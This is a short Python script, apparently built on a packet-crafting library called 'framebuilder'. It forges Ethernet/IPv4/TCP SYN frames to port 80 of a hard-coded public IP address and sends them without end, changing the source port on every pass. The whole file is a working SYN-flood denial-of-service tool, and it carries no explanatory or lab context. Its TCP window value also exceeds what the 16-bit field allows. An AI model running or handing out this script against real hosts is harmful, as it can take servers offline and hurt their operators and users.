#!/usr/bin/env python3

from framebuilder import tools, eth, ipv4, tcp

socket = tools.create_socket('eth0')

packet = ipv4.IPv4Packet()
packet.src_addr = '10.20.32.10'
packet.dst_addr = '78.47.151.229'
packet.ttl = 64
packet.protocol = 6
packet.identification = 123
packet.flags=2

segment = tcp.TCPSegment()
segment.dst_port = 80
segment.seq_nr = 1234567
segment.window = 8901234
segment.syn = 1

frame = eth.Frame()
frame.src_addr = '48:2a:e3:9d:3b:c7'
frame.dst_addr = '6c:b3:11:08:36:28'
frame.ether_type = 0x0800

dport = 0
while True:
    dport = (dport + 1) & 0xffff
    segment.src_port = dport
    segment.encapsulate(packet)
    frame.payload = packet.get_bytes()
    frame.send(socket)
